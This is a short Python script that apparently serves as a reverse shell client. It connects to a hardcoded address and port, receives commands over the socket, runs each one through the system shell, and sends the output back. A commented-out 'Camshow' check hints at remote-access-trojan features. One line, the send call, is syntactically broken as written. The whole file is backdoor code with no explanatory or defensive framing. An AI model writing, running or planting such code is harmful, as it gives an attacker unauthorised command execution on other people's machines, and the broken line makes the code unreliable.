import subprocess
import socket
import time

import os
import sys
def Socket():
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
        s.connect((INd,POrt))
        while True:
            cmd=s.recv(1024)
            data=cmd.decode("utf-8")
            #if (data=="Camshow"):
            if len(data)>0:
                p=subprocess.run(data,shell=True,capture_output=True)
                data=p.stdout+p.stderr
                s.sendall(b"$ : "data)











if __name__=="__main__":
    INd="127.0.0.1"
    POrt=1025
    Socket()